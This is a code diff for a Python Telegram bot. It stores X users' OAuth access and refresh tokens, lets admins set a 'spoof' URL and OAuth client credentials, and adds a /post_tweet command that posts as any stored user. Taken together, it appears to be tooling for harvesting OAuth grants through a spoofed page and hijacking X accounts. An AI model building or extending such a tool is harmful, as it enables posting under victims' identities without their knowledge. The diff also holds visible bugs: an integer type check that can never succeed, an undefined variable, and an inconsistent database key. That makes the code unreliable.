@@ -1,8 +1,11 @@
+
+import re
 import uuid
 from bot.handlers import keyboards
 
 from telegram import Update
 from telegram.ext import ContextTypes
+from telegram.constants import ChatMemberStatus
 
 from shared.db import get_db
 from shared.config import config
@@ -42,14 +45,14 @@ async def help(update, context) -> None:
 async def setup(update, context):
     chat_id = update.effective_chat.id
 
-    if not await permission_check(update): return
+    if not await permission_check(update, context, groups, setup_command=True): return
 
     group = groups.find_one({"group.id": chat_id})
     if group:
         text = "⚠️ *This group is already setup for OAuth\\.*"
         return await context.bot.send_message(chat_id, text, parse_mode)
 
-    owner = next(admin.user for admin in await context.bot.get_chat_administrators(chat_id) if admin.status == "creator")
+    owner = next(admin.user for admin in await context.bot.get_chat_administrators(chat_id) if admin.status == ChatMemberStatus.ADMINISTRATOR)
     owner_id = owner.id
     owner_fullname = parse(owner.full_name)
 
@@ -85,7 +88,7 @@ async def setup(update, context):
 async def display_endpoint(update, context) -> None:
     chat_id = update.effective_chat.id
     
-    if not await permission_check(update, groups): return
+    if not await permission_check(update, context, groups): return
 
     user_id = update.effective_user.id
 
@@ -96,7 +99,7 @@ async def display_endpoint(update, context) -> None:
     client_secret = group["client"]["secret"]
 
     if not client_id or not client_secret:
-        text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set_client_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}\\."
+        text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set\\_client\\_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}_\\."
     else:
         identifier = matched["identifier"]
         endpoint = parse(DOMAIN + f"/oauth?i={identifier}")
@@ -106,10 +109,60 @@ async def display_endpoint(update, context) -> None:
 
     await context.bot.send_message(chat_id, text, parse_mode)
 
+async def set_client_id(update, context) -> None:
+    chat_id = update.effective_chat.id
+
+    if not await permission_check(update, context, groups, admin_command=True): return
+    
+    args = context.args
+    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_id <client_id>')
+    
+    group = groups.find_one({"group.id": chat_id})
+
+    client_id = args[0]
+    client_secret = group["client"]["secret"]
+
+    if re.match("^[a-zA-Z0-9]+$", client_id) and len(client_id) == 34:
+        groups.update_one(
+            {"group.id": chat_id},
+            {"$set": {f"client.id": client_id}}
+        )
+        
+        text = f"✅ *Client ID has successfully been set\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
+    else:
+        text = "⚠️ *The client ID provided is invalid\\.*"
+        
+    await context.bot.send_message(chat_id, text, parse_mode)
+
+async def set_client_secret(update, context) -> None:
+    chat_id = update.effective_chat.id
+
+    if not await permission_check(update, context, groups, admin_command=True): return
+
+    args = context.args
+    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_secret <client_secret>')
+    
+    group = groups.find_one({"group.id": chat_id})
+
+    client_secret = args[0]
+    client_id = group["client"]["id"]
+
+    if (len(client_secret) == 50 and re.match("^[a-zA-Z0-9_-]+$", client_secret)):
+        groups.update_one(
+            {"group.id": chat_id},
+            {"$set": {f"client.secret": client_secret}}
+        )
+        
+        text = f"✅ *Client secret has successfully been set for this group\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
+    else:
+        text = "⚠️ *The client secret provided is invalid\\.*"
+        
+    await context.bot.send_message(chat_id, text, parse_mode)
+
 async def set_redirect(update, context) -> None:
     chat_id = update.effective_chat.id
     
-    if not await permission_check(update, groups, admin_command=True): return
+    if not await permission_check(update, context, groups, admin_command=True): return
     
     args = context.args
     if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_redirect <url>')
@@ -130,7 +183,7 @@ async def set_redirect(update, context) -> None:
 async def set_spoof(update, context) -> None:
     chat_id = get_chat_id(update)
     
-    if not await permission_check(update, groups, admin_command=True): return
+    if not await permission_check(update, context, groups, admin_command=True): return
     
     args = context.args
     if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_spoof <url>')
@@ -158,7 +211,7 @@ async def set_spoof(update, context) -> None:
 async def display_users(update, context, page=1, message_id=None) -> None:
     chat_id = update.effective_chat.id
     
-    if not await permission_check(update, groups): return
+    if not await permission_check(update, context, groups): return
         
     group = groups.find_one({"group.id": chat_id})
     users = group['users']
@@ -205,3 +258,42 @@ async def display_users(update, context, page=1, message_id=None) -> None:
     else:
         text = "*👤 Authenticated Users*\n\n> Nothing to see here 👀"
         await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)
+
+async def post_tweet(update, context) -> None:
+    chat_id = update.effective_chat.id
+
+    if not await permission_check(update, context, groups, admin_command=True): return
+
+    args = context.args
+    if len(args) < 2: return await update.message.reply_text('⚙️ Usage: /post_tweet <community_id|optional> <username> <message>')
+
+    community_id = int(args[0]) if type(args[0]) == int else 0
+    is_community = True if type(args[0]) == int else False
+        
+    group = groups.find_one({"group_id": chat_id})
+
+    user = next((u for u in group.get('users', []) if (u['username'].lower() == args[0].lower() if not is_community else u['username'].lower() == args[1].lower())), None)
+    if not user:
+        text = f"⚠️ *User _{formatted}_ has not authorized with OAuth\\.*"
+        return await context.bot.send_message(chat_id, text, parse_mode)
+        
+    message = ' '.join(arg.strip()
+                          for arg in args[1:]).replace('\\n', '\n')
+    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), user["username"]
+    if access_token:
+        res, r = tweet(chat_id=chat_id, token=access_token, message=message, is_community=is_community, community_id=community_id)
+        
+        if res.status_code == 201:
+            return await handle_successful_tweet(context, chat_id, username, r, is_community=is_community)
+            
+        if res.status_code == 401:
+            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)
+    
+        if res.status_code == 403:
+            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)
+
+        await handle_generic_error(context, chat_id, res, r)
+    else:
+        username = filter_text(username)
+        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
+        await context.bot.send_message(chat_id, text, parse_mode)
